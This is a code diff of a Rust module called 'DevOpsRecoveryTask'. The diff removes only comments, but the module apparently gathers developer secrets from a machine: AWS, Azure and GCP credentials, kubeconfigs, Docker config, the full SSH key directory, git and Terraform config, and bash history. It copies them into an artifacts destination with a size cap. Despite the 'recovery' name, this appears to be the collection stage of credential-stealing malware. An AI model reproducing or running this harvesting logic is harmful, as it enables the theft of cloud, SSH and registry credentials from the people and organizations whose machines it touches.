@@ -31,7 +31,6 @@ impl DevOpsRecoveryTask {
         let appdata = &ctx.roaming_data_dir;
         let mut specs = Vec::new();
 
-        // --- AWS ---
         let aws_creds = env::var("AWS_SHARED_CREDENTIALS_FILE")
             .map(PathBuf::from)
             .unwrap_or_else(|_| home.join(".aws").join("credentials"));
@@ -50,7 +49,6 @@ impl DevOpsRecoveryTask {
             is_dir: false,
         });
 
-        // --- Azure ---
         specs.push(DevOpsSpec {
             label: "Azure Profile".into(),
             path: home.join(".azure").join("azureProfile.json"),
@@ -62,7 +60,6 @@ impl DevOpsRecoveryTask {
             is_dir: false,
         });
 
-        // --- GCP ---
         specs.push(DevOpsSpec {
             label: "GCP Credentials".into(),
             path: home
@@ -72,9 +69,7 @@ impl DevOpsRecoveryTask {
             is_dir: false,
         });
 
-        // --- Kubernetes ---
         if let Ok(k_config) = env::var("KUBECONFIG") {
-            // KUBECONFIG can be a list of paths
             for (i, path) in env::split_paths(&k_config).enumerate() {
                 specs.push(DevOpsSpec {
                     label: format!("Kubeconfig (Env {})", i),
@@ -90,7 +85,6 @@ impl DevOpsRecoveryTask {
             });
         }
 
-        // --- Docker ---
         let docker_config = env::var("DOCKER_CONFIG")
             .map(PathBuf::from)
             .map(|p| p.join("config.json"))
@@ -101,14 +95,12 @@ impl DevOpsRecoveryTask {
             is_dir: false,
         });
 
-        // --- SSH ---
         specs.push(DevOpsSpec {
             label: "SSH Keys".into(),
             path: home.join(".ssh"),
             is_dir: true,
         });
 
-        // --- Git ---
         specs.push(DevOpsSpec {
             label: "Git Config".into(),
             path: home.join(".gitconfig"),
@@ -120,7 +112,6 @@ impl DevOpsRecoveryTask {
             is_dir: false,
         });
 
-        // --- Terraform ---
         specs.push(DevOpsSpec {
             label: "Terraform RC".into(),
             path: home.join(".terraform.rc"),
@@ -132,7 +123,6 @@ impl DevOpsRecoveryTask {
             is_dir: true,
         });
 
-        // --- Shell History ---
         specs.push(DevOpsSpec {
             label: "Bash History".into(),
             path: home.join(".bash_history"),
@@ -195,7 +185,7 @@ impl RecoveryTask for DevOpsRecoveryTask {
                                 &dest,
                                 &spec.label,
                                 &mut task_artifacts,
-                                1024 * 1024 * 50, // 50MB limit
+                                1024 * 1024 * 50,
                                 0,
                             )
                             .await;
